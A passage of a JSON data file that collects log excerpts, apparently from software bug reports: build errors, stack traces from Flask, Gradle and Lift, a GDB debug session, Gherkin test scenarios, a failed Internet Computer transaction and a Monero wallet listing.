        "logs": "Building library for genvalidity-0.11.0.2..                                                                                         \r\n[2 of 4] Compiling Data.GenValidity                               \r\n                                                                                                                                    \r\n/var/stackage/work/unpack-dir/unpacked/genvalidity-0.11.0.2-3d6a0489512630870494f29bc8efefa8f2cf6dfa55f45eb6373e17849e5d5598/src/Data/GenValidity.hs:652:50: error:                                   \r\n    \u2022 Variable not in scope: isLineSeparator :: Char -> Bool                                                                        \r\n    \u2022 Perhaps you meant \u2018genLineSeparator\u2019 (line 649)                                                                               \r\n    |                                                                                                                               \r\n652 | genNonLineSeparator = genValid "
    },
    {
        "logs": "ninja: error: 'stdlib/private/OSLog/swift_Concurrency-swiftmodule-macosx-arm64', needed by 'stdlib/private/OSLog/OSX/arm64/OSLogTestHelper.o', missing and no known rule to make it"
    },
    {
        "logs": "ninja: error: 'stdlib/private/OSLog/swift_Concurrency-swiftmodule-macosx-arm64', needed by 'stdlib/private/OSLog/OSX/arm64/OSLogTestHelper.o', missing and no known rule to make it"
    },
    {
        "logs": " Gherkin\r\nScenario 1: Tokens with 0 recommended decimal places\r\nGiven I have tokens with 0 recommended decimal places\r\nAnd I haven't altered any settings\r\nWhen I navigate to Summary -> Tokens\r\nThen there is no warning icon shown next to the token\r\n\r\nScenario 2: Tokens with 0 recommended decimal places with altered settings\r\nGiven I have tokens with 0 recommended decimal places\r\nAnd in Settings, I have saved the number of decimal places to  > 0\r\nWhen I navigate to Summary -> Tokens\r\nThen there is a warning icon shown next to the token\r\nAnd upon hovering the tooltip displays \r\n\"You are not using recommended decimal place configuration for this native token\"\r\n\r\nScenario 3: Tokens with non zero ( > 0) recommended decimal places\r\nGiven I have tokens with non zero ( > 0) recommended decimal places\r\nAnd I haven't altered any settings\r\nWhen I navigate to Summary -> Tokens\r\nThen there is a warning icon shown next to the token\r\nAnd upon hovering the tooltip displays \r\n\"The recommended value for decimal place configuration for this native token is X decimal places\"\r\n\r\nScenario 4: Tokens with non zero ( > 0) recommended decimal places with altered settings to recommended\r\nGiven I have tokens with non zero ( > 0) recommended decimal places\r\nAnd in Settings, I have saved the number of decimal places to the recommended\r\nWhen I navigate to Summary -> Tokens\r\nThen there is no warning icon shown next to the token"
    },
    {
        "logs": " Gherkin\r\nScenario 1: Tokens with 0 recommended decimal places\r\nGiven I have tokens with 0 recommended decimal places\r\nAnd I haven't altered any settings\r\nWhen I navigate to Summary -> Tokens\r\nThen there is no warning icon shown next to the token\r\n\r\nScenario 2: Tokens with 0 recommended decimal places with altered settings\r\nGiven I have tokens with 0 recommended decimal places\r\nAnd in Settings, I have saved the number of decimal places to  > 0\r\nWhen I navigate to Summary -> Tokens\r\nThen there is a warning icon shown next to the token\r\nAnd upon hovering the tooltip displays \r\n\"You are not using recommended decimal place configuration for this native token\"\r\n\r\nScenario 3: Tokens with non zero ( > 0) recommended decimal places\r\nGiven I have tokens with non zero ( > 0) recommended decimal places\r\nAnd I haven't altered any settings\r\nWhen I navigate to Summary -> Tokens\r\nThen there is a warning icon shown next to the token\r\nAnd upon hovering the tooltip displays \r\n\"The recommended value for decimal place configuration for this native token is X decimal places\"\r\n\r\nScenario 4: Tokens with non zero ( > 0) recommended decimal places with altered settings to recommended\r\nGiven I have tokens with non zero ( > 0) recommended decimal places\r\nAnd in Settings, I have saved the number of decimal places to the recommended\r\nWhen I navigate to Summary -> Tokens\r\nThen there is no warning icon shown next to the token"
    },
    {
        "logs": "{\r\n    \"code\": 770,\r\n    \"message\": \"Operation failed\",\r\n    \"retriable\": false,\r\n    \"details\": {\r\n        \"operations\": [\r\n            {\r\n                \"amount\": {\r\n                    \"e8s\": 100000\r\n                },\r\n                \"fee\": {\r\n                    \"e8s\": 10000\r\n                },\r\n                \"from\": \"89a472bb2badae8d062e28901c8b6af57ec1352649e4a0f6e755ec4ea56c2d4e\",\r\n                \"response\": {\r\n                    \"code\": 740,\r\n                    \"details\": {\r\n                        \"error_message\": \"Failed to authenticate request 0xe1504898ca77b896bd262859d12a5ddba917a51c6fba6e74a367e9b8fc7b359d due to: Invalid signature: Invalid basic signature: Ed25519 signature could not be verified: public key 214646b3fdff4371282fb9c7dc90ba39d54e953dcc7353f34a9bf7e4ab8e91a9, signature 194e2302013444b4873c0f94c7c4b40d0f46a3709aaf8b51100e83c844953cb485f132e78d5790c2a3ba1b3579beb150974ebe7b371816d7f9d8ba4114738407, error: signature error\",\r\n                        \"ic_http_status\": 403\r\n                    },\r\n                    \"message\": \"Internet Computer error\",\r\n                    \"retriable\": false\r\n                },\r\n                \"status\": \"FAILED\",\r\n                \"to\": \"6499d6b24ce488c263cb7aba350249f73d81d6e1caa4fb6fae09d8b3e3f91846\",\r\n                \"transaction_identifier\": {\r\n                    \"hash\": \"d5e2577ce5c7766375fc9894f0e1622ce0a6478003c10c61fc6f2054466f840a\"\r\n                },\r\n                \"type\": \"TRANSACTION\"\r\n            }\r\n        ]\r\n    }\r\n}"
    },
    {
        "logs": "[wallet 9xLMUj]: incoming_transfers available\r\n               amount   spent    unlocked  ringct    global index                                                               tx id      addr index\r\n       0.021846280000       F    unlocked  RingCT          326479  <25cebe40f22757a9284448013564110c785432d8a6111bd76594ab01043a37ad>               0\r\n       0.024081800000       F    unlocked  RingCT          326998  <10810ca2bba18f8bf3287fea5ddb11f88f0135296f28baf07e2615505c530786>               0\r\n       0.010000000000       F    unlocked  RingCT          330773  <3ca10a03457ffa1c5a4fe1ee531b6bbbef13ca9a13a44b1acc53425a8ae0c3a6>               0\r\n       0.071060800000       F    unlocked  RingCT          331324  <99db5d8a48ba549644f37850cbf03e2353fa5248b422a0074d0cb009e0b93e3d>               0\r\n      12.151529932305       F    unlocked  RingCT          334738  <024bcd32f3866285437ea96ddc5c5ca484ada14dbe964f259bf4403b8a4b4c8d>               0\r\n       0.100000000000       F    unlocked  RingCT          334829  <eae1eaefbe88ddc1830446929eff12249df8197a92e0778c0c9b2b397691de16>               3\r\n      15.844230600000       F    unlocked  RingCT          342292  <2c81dc2ff995c1901056ce8d225a9d2849e7e7bc24e25ebb2998e0180ee4113c>               0\r\n       0.030786040000       F    unlocked  RingCT          345133  <e5f749147e5bcad21064c6f6d2339138d89397eff83945787adec4ea166af310>               0\r\n\r\n[wallet 9xLMUj]: sweep_below 0.025 9xLMUjRpNfEQLoYwogkmiBg9H6XP18mJ3UJphkvhWo9SB3vwbJFSryNfVz6vJFigYwLadki17xHQG7qsxQnnZPuPC1XvpHq\r\nError: Not enough money in unlocked balance"
    },
    {
        "logs": "[wallet 9xLMUj]: incoming_transfers available\r\n               amount   spent    unlocked  ringct    global index                                                               tx id      addr index\r\n       0.021846280000       F    unlocked  RingCT          326479  <25cebe40f22757a9284448013564110c785432d8a6111bd76594ab01043a37ad>               0\r\n       0.024081800000       F    unlocked  RingCT          326998  <10810ca2bba18f8bf3287fea5ddb11f88f0135296f28baf07e2615505c530786>               0\r\n       0.010000000000       F    unlocked  RingCT          330773  <3ca10a03457ffa1c5a4fe1ee531b6bbbef13ca9a13a44b1acc53425a8ae0c3a6>               0\r\n       0.071060800000       F    unlocked  RingCT          331324  <99db5d8a48ba549644f37850cbf03e2353fa5248b422a0074d0cb009e0b93e3d>               0\r\n      12.151529932305       F    unlocked  RingCT          334738  <024bcd32f3866285437ea96ddc5c5ca484ada14dbe964f259bf4403b8a4b4c8d>               0\r\n       0.100000000000       F    unlocked  RingCT          334829  <eae1eaefbe88ddc1830446929eff12249df8197a92e0778c0c9b2b397691de16>               3\r\n      15.844230600000       F    unlocked  RingCT          342292  <2c81dc2ff995c1901056ce8d225a9d2849e7e7bc24e25ebb2998e0180ee4113c>               0\r\n       0.030786040000       F    unlocked  RingCT          345133  <e5f749147e5bcad21064c6f6d2339138d89397eff83945787adec4ea166af310>               0\r\n\r\n[wallet 9xLMUj]: sweep_below 0.025 9xLMUjRpNfEQLoYwogkmiBg9H6XP18mJ3UJphkvhWo9SB3vwbJFSryNfVz6vJFigYwLadki17xHQG7qsxQnnZPuPC1XvpHq\r\nError: Not enough money in unlocked balance"
    },
    {
        "logs": "ruby\r\nfoo = Foo.new(bar: 42)\r\n# fires on success or failure\r\nfoo.save.then do\r\n  # ensure the record hasn't been saved\r\n  # otherwise it would do a remote destroy\r\n  foo.destroy if record.errors.any?\r\nend"
    },
    {
        "logs": "ruby\r\nfoo = Foo.new(bar: 42)\r\n# fires on success or failure\r\nfoo.save.then do\r\n  # ensure the record hasn't been saved\r\n  # otherwise it would do a remote destroy\r\n  foo.destroy if record.errors.any?\r\nend"
    },
    {
        "logs": "ERROR in app: Exception on /api/v1/image [GET]                                                                     \r\nTraceback (most recent call last):                                         \r\n  File \"/home/gema/src/mr-provisioner/venv/lib/python3.6/site-packages/flask/app.py\", line 1982, in wsgi_app\r\n    response = self.full_dispatch_request()                                                                                                                                                                                                                                 \r\n  File \"/home/gema/src/mr-provisioner/venv/lib/python3.6/site-packages/flask/app.py\", line 1614, in full_dispatch_request\r\n    rv = self.handle_user_exception(e)                                                                                                                                                                                                                                                              \r\n  File \"/home/gema/src/mr-provisioner/venv/lib/python3.6/site-packages/flask_cors/extension.py\", line 161, in wrapped_function                                                                                                                                                                 \r\n    return cors_after_request(app.make_response(f(*args, **kwargs)))                                                                                                                                                                                                          \r\n  File \"/home/gema/src/mr-provisioner/venv/lib/python3.6/site-packages/flask/app.py\", line 1517, in handle_user_exception                                                                                                                                                \r\n    reraise(exc_type, exc_value, tb)                                                       \r\n  File \"/home/gema/src/mr-provisioner/venv/lib/python3.6/site-packages/flask/_compat.py\", line 33, in reraise\r\n    raise value                                                                                                                                                                                                                                                                                     \r\n  File \"/home/gema/src/mr-provisioner/venv/lib/python3.6/site-packages/flask/app.py\", line 1612, in full_dispatch_request                                                                                                                                                                      \r\n    rv = self.dispatch_request()                                                                                                                                                                                                                                                \r\n  File \"/home/gema/src/mr-provisioner/venv/lib/python3.6/site-packages/flask/app.py\", line 1598, in dispatch_request                                                                                                                                                       \r\n    return self.view_functions[rule.endpoint](**req.view_args)                             \r\n  File \"/home/gema/src/mr-provisioner/mr_provisioner/api/v1/controllers.py\", line 797, in images_get\r\n    return jsonify([serialize_image(i) for i in images]), 200                                                                                                                                                                                                                                              \r\n  File \"/home/gema/src/mr-provisioner/mr_provisioner/api/v1/controllers.py\", line 797, in <listcomp>\r\n    return jsonify([serialize_image(i) for i in images]), 200                      \r\n  File \"/home/gema/src/mr-provisioner/mr_provisioner/api/v1/controllers.py\", line 67, in serialize_image\r\n    'user': image.user.username,                                                                                                                                                                                                                                                                           \r\nAttributeError: 'NoneType' object has no attribute 'username'    "
    },
    {
        "logs": "Please check OUTPUT tab (Adapter Output) for log of C:/Program Files (x86)/SEGGER/JLink/JLinkGDBServer.exe\r\nLaunching server: \"C:/Program Files (x86)/SEGGER/JLink/JLinkGDBServer.exe\" \"-if\" \"jtag\" \"-port\" \"50000\" \"-swoport\" \"50001\" \"-telnetport\" \"50002\" \"-device\" \"cortex-a7\"\r\n1-gdb-set target-async on\r\n2-interpreter-exec console \"source c:/Users/SESA548172/.vscode/extensions/marus25.cortex-debug-0.3.1/support/gdbsupport.init\"\r\n3-target-select extended-remote localhost:50000\r\n4-interpreter-exec console \"monitor halt\"\r\n5-interpreter-exec console \"monitor reset\"\r\n6-target-download\r\n7-interpreter-exec console \"monitor reset\"\r\n8-enable-pretty-printing\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":false,\"type\":\"notify\",\"asyncClass\":\"thread-group-added\",\"output\":[[\"id\",\"i1\"]]}]}\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"console\",\"content\":\"Reading symbols from C:\\\\dev/iron-sparrow/app/sumx.elf...\"}]}\r\nReading symbols from C:\\dev/iron-sparrow/app/sumx.elf...\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"console\",\"content\":\"done.\\n\"}]}\r\ndone.\r\nGDB -> App: {\"token\":1,\"outOfBandRecord\":[],\"resultRecords\":{\"resultClass\":\"done\",\"results\":[]}}\r\nGDB -> App: {\"token\":2,\"outOfBandRecord\":[],\"resultRecords\":{\"resultClass\":\"done\",\"results\":[]}}\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":false,\"type\":\"notify\",\"asyncClass\":\"thread-group-started\",\"output\":[[\"id\",\"i1\"],[\"pid\",\"42000\"]]}]}\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":false,\"type\":\"notify\",\"asyncClass\":\"thread-created\",\"output\":[[\"id\",\"1\"],[\"group-id\",\"i1\"]]}]}\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"console\",\"content\":\"wdog_trigger () at ../aos/aos/wdog.c:102\\n\"}]}\r\nwdog_trigger () at ../aos/aos/wdog.c:102\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"console\",\"content\":\"102\\t    for (;;);\\n\"}]}\r\n102\t    for (;;);\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":false,\"type\":\"exec\",\"asyncClass\":\"stopped\",\"output\":[[\"frame\",[[\"addr\",\"0x801b41be\"],[\"func\",\"wdog_trigger\"],[\"args\",[]]]],[\"file\",\"../aos/aos/wdog.c\"],[\"fullname\",\"C:\\\\dev\\\\iron-sparrow\\\\aos\\\\aos\\\\wdog.c\"],[\"line\",\"102\"]]}]}\r\nNot implemented stop reason (assuming exception): undefined\r\nGDB -> App: {\"token\":3,\"outOfBandRecord\":[],\"resultRecords\":{\"resultClass\":\"connected\",\"results\":[]}}\r\nGDB -> App: {\"token\":4,\"outOfBandRecord\":[],\"resultRecords\":{\"resultClass\":\"done\",\"results\":[]}}\r\n9-thread-list-ids\r\n10-thread-list-ids\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"target\",\"content\":\"Resetting target\\r\\n\"}]}"
    },
    {
        "logs": "Error: Cannot resolve all parameters for 'Service'(Http, @Inject). Make sure that all the parameters are decorated with Inject or have valid type annotations and that 'Service' is decorated with Injectable."
    },
    {
        "logs": "Error: Cannot resolve all parameters for 'Service'(Http, @Inject). Make sure that all the parameters are decorated with Inject or have valid type annotations and that 'Service' is decorated with Injectable."
    },
    {
        "logs": "Magic number is wrong -- are you sure this is a DEX file?\r\nError counting dex methods. Please contact the developer at https://github.com/KeepSafe/dexcount-gradle-plugin/issues\r\ncom.getkeepsafe.dexcount.DexCountException: Error loading dex file\r\n\tat com.getkeepsafe.dexcount.DexFile.<init>(DexFile.kt:71)\r\n\tat com.getkeepsafe.dexcount.DexFile.<init>(DexFile.kt:58)\r\n\tat com.getkeepsafe.dexcount.DexFile$Companion$extractDexFromZip$1$2.invoke(DexFile.kt:195)\r\n\tat com.getkeepsafe.dexcount.DexFile$Companion$extractDexFromZip$1$2.invoke(DexFile.kt:82)\r\n\tat kotlin.sequences.TransformingSequence$iterator$1.next(Sequences.kt:172)\r\n\tat kotlin.sequences.SequencesKt___SequencesKt.toCollection(_Sequences.kt:702)\r\n\tat kotlin.sequences.SequencesKt___SequencesKt.toMutableList(_Sequences.kt:732)\r\n\tat kotlin.sequences.SequencesKt___SequencesKt.toList(_Sequences.kt:723)\r\n\tat com.getkeepsafe.dexcount.DexFile$Companion$extractDexFromZip$1.invoke(DexFile.kt:197)\r\n\tat com.getkeepsafe.dexcount.DexFile$Companion$extractDexFromZip$1.invoke(DexFile.kt:82)\r\n\tat com.getkeepsafe.dexcount.DexFileKt.unzip(DexFile.kt:206)\r\n\tat com.getkeepsafe.dexcount.DexFileKt.access$unzip(DexFile.kt:1)\r\n\tat com.getkeepsafe.dexcount.DexFile$Companion.extractDexFromZip(DexFile.kt:189)\r\n\tat com.getkeepsafe.dexcount.DexFile$Companion.extractDexData(DexFile.kt:105)\r\n\tat com.getkeepsafe.dexcount.DexMethodCountTaskBase.generatePackageTree(Tasks.kt:172)\r\n\tat com.getkeepsafe.dexcount.DexMethodCountTaskBase.countMethods(Tasks.kt:134)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:498)\r\n\tat org.gradle.internal.reflect.JavaMethod.invoke(JavaMethod.java:103)\r\n\tat org.gradle.api.internal.project.taskfactory.StandardTaskAction.doExecute(StandardTaskAction.java:49)\r\n\tat org.gradle.api.internal.project.taskfactory.StandardTaskAction.execute(StandardTaskAction.java:42)\r\n\tat org.gradle.api.internal.project.taskfactory.StandardTaskAction.execute(StandardTaskAction.java:28)\r\n\tat org.gradle.api.internal.AbstractTask$TaskActionWrapper.execute(AbstractTask.java:717)\r\n\tat org.gradle.api.internal.AbstractTask$TaskActionWrapper.execute(AbstractTask.java:684)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter$5.run(ExecuteActionsTaskExecuter.java:476)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor$RunnableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:402)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor$RunnableBuildOperationWorker.execute(DefaultBuildOperationExecutor.java:394)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor$1.execute(DefaultBuildOperationExecutor.java:165)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:250)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor.execute(DefaultBuildOperationExecutor.java:158)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:92)\r\n\tat org.gradle.internal.operations.DelegatingBuildOperationExecutor.run(DelegatingBuildOperationExecutor.java:31)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeAction(ExecuteActionsTaskExecuter.java:461)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeActions(ExecuteActionsTaskExecuter.java:444)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.access$200(ExecuteActionsTaskExecuter.java:93)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter$TaskExecution.execute(ExecuteActionsTaskExecuter.java:237)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep.lambda$execute$1(ExecuteStep.java:33)\r\n\tat java.util.Optional.orElseGet(Optional.java:267)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:33)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:26)\r\n\tat org.gradle.internal.execution.steps.CleanupOutputsStep.execute(CleanupOutputsStep.java:58)\r\n\tat org.gradle.internal.execution.steps.CleanupOutputsStep.execute(CleanupOutputsStep.java:35)\r\n\tat org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:48)\r\n\tat org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:33)\r\n\tat org.gradle.internal.execution.steps.CancelExecutionStep.execute(CancelExecutionStep.java:39)\r\n\tat org.gradle.internal.execution.steps.TimeoutStep.executeWithoutTimeout(TimeoutStep.java:73)\r\n\tat org.gradle.internal.execution.steps.TimeoutStep.execute(TimeoutStep.java:54)\r\n\tat org.gradle.internal.execution.steps.CatchExceptionStep.execute(CatchExceptionStep.java:35)\r\n\tat org.gradle.internal.execution.steps.CreateOutputsStep.execute(CreateOutputsStep.java:51)\r\n\tat org.gradle.internal.execution.steps.SnapshotOutputsStep.execute(SnapshotOutputsStep.java:45)\r\n\tat org.gradle.internal.execution.steps.SnapshotOutputsStep.execute(SnapshotOutputsStep.java:31)\r\n\tat org.gradle.internal.execution.steps.CacheStep.executeWithoutCache(CacheStep.java:208)\r\n\tat org.gradle.internal.execution.steps.CacheStep.execute(CacheStep.java:70)\r\n\tat org.gradle.internal.execution.steps.CacheStep.execute(CacheStep.java:45)\r\n\tat org.gradle.internal.execution.steps.BroadcastChangingOutputsStep.execute(BroadcastChangingOutputsStep.java:49)\r\n\tat org.gradle.internal.execution.steps.StoreSnapshotsStep.execute(StoreSnapshotsStep.java:43)\r\n\tat org.gradle.internal.execution.steps.StoreSnapshotsStep.execute(StoreSnapshotsStep.java:32)\r\n\tat org.gradle.internal.execution.steps.RecordOutputsStep.execute(RecordOutputsStep.java:38)\r\n\tat org.gradle.internal.execution.steps.RecordOutputsStep.execute(RecordOutputsStep.java:24)\r\n\tat org.gradle.internal.execution.steps.SkipUpToDateStep.executeBecause(SkipUpToDateStep.java:96)\r\n\tat org.gradle.internal.execution.steps.SkipUpToDateStep.lambda$execute$0(SkipUpToDateStep.java:89)\r\n\tat java.util.Optional.map(Optional.java:215)\r\n\tat org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:54)\r\n\tat org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:38)\r\n\tat org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:76)\r\n\tat org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:37)\r\n\tat org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:36)\r\n\tat org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:26)\r\n\tat org.gradle.internal.execution.steps.ResolveCachingStateStep.execute(ResolveCachingStateStep.java:90)\r\n\tat org.gradle.internal.execution.steps.ResolveCachingStateStep.execute(ResolveCachingStateStep.java:48)\r\n\tat org.gradle.internal.execution.steps.CaptureStateBeforeExecutionStep.execute(CaptureStateBeforeExecutionStep.java:69)\r\n\tat org.gradle.internal.execution.steps.CaptureStateBeforeExecutionStep.execute(CaptureStateBeforeExecutionStep.java:47)\r\n[Truncated]\n\tat org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.executeNextNode(DefaultPlanExecutor.java:193)\r\n\tat org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:129)\r\n\tat org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)\r\n\tat org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48)\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n\tat org.gradle.internal.concurrent.ThreadFactoryImpl$ManagedThreadRunnable.run(ThreadFactoryImpl.java:56)\r\n\tat java.lang.Thread.run(Thread.java:748)\r\nCaused by: com.android.dexdeps.DexDataException\r\n\tat com.android.dexdeps.DexData.parseHeaderItem(DexData.java:89)\r\n\tat com.android.dexdeps.DexData.load(DexData.java:55)\r\n\tat com.getkeepsafe.dexcount.DexFile.<init>(DexFile.kt:67)\r\n\t... 112 more"
    },
    {
        "logs": "TASK [username_2.code_server : Enable code-server service] ***************************************************************\r\nfatal: [192.168.1.100]: FAILED! => {\"changed\": false, \"msg\": \"Could not find the requested service code-server: host\"}"
    },
    {
        "logs": "Exception occured while processing /export/timesheet/-31\r\nMessage: java.lang.NullPointerException\r\n\tjava.io.ByteArrayInputStream.<init>(ByteArrayInputStream.java:106)\r\n\tcode.export.ExcelExport$.exportTimesheet(ExcelExport.scala:94)\r\n\tbootstrap.liftweb.Boot$$anonfun$boot$3$$anonfun$applyOrElse$1.apply(Boot.scala:197)\r\n\tbootstrap.liftweb.Boot$$anonfun$boot$3$$anonfun$applyOrElse$1.apply(Boot.scala:191)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$liftedTree1$1$1.apply(LiftServlet.scala:485)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$liftedTree1$1$1.apply(LiftServlet.scala:485)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.functionLifespan(S.scala:1833)\r\n\tnet.liftweb.http.S$.functionLifespan(S.scala:47)\r\n\tnet.liftweb.http.LiftServlet.liftedTree1$1(LiftServlet.scala:484)\r\n\tnet.liftweb.http.LiftServlet.net$liftweb$http$LiftServlet$$dispatchStatefulRequest(LiftServlet.scala:472)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$$anonfun$doSession$1$1.apply(LiftServlet.scala:385)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$$anonfun$doSession$1$1.apply(LiftServlet.scala:385)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$wrapQuery(S.scala:1562)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_nest2InnerInit$1$$anonfun$apply$40.apply(S.scala:1718)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$doAround(S.scala:1491)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$doAround$1.apply(S.scala:1492)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1(DB.scala:235)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15$$anonfun$net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1$1.apply(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15$$anonfun$net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1$1.apply(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anonfun$use$1.apply(DB.scala:684)\r\n\tnet.liftweb.util.DynoVar$class.run(ThreadGlobal.scala:95)\r\n\tnet.liftweb.db.DB$currentConn$.run(DB.scala:669)\r\n\tnet.liftweb.db.DB$class.use(DB.scala:681)\r\n\tnet.liftweb.db.DB$$anon$1.use(DB.scala:40)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.apply(DB.scala:253)\r\n\tnet.liftweb.util.DynoVar$class.run(ThreadGlobal.scala:95)\r\n\tnet.liftweb.db.DB$$anon$2$DepthCnt$.run(DB.scala:224)\r\n\tnet.liftweb.db.DB$$anon$2.apply(DB.scala:227)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$doAround(S.scala:1492)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_nest2InnerInit$1.apply(S.scala:1716)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_nest2InnerInit(S.scala:1715)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45$$anonfun$apply$46$$anonfun$apply$47.apply(S.scala:1762)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$withReq$2.apply(S.scala:1772)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.withReq(S.scala:1771)\r\n\tnet.liftweb.http.S$.withReq(S.scala:47)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45$$anonfun$apply$46.apply(S.scala:1757)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45.apply(S.scala:1755)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44.apply(S.scala:1754)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1.apply(S.scala:1753)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_innerInit(S.scala:1752)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54$$anonfun$apply$55$$anonfun$apply$56.apply(S.scala:1795)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54$$anonfun$apply$55.apply(S.scala:1793)\r\n\tnet.liftweb.http.CoreRequestVarHandler$class.apply(Vars.scala:605)\r\n\tnet.liftweb.http.RequestVarHandler$.apply(Vars.scala:507)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54.apply(S.scala:1792)\r\n\tnet.liftweb.http.CoreRequestVarHandler$class.apply(Vars.scala:605)\r\n\tnet.liftweb.http.TransientRequestVarHandler$.apply(Vars.scala:520)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53.apply(S.scala:1791)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_